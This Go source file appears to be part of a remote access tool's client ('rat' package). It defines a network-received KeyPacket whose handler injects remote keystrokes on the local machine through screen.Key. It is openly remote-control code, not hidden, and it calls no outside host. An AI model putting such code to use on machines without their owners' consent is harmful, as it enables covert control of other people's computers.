package main

import "rat/common"
import "rat/client/screen"

type KeyPacket struct {
	Key  int `network:"receive"`
	Type int `network:"receive"`
}

func (packet KeyPacket) Header() common.PacketHeader {
	return common.KeyHeader
}

func (packet KeyPacket) OnReceive() error {
	screen.Key(uint16(packet.Key), packet.Type)

	return nil
}
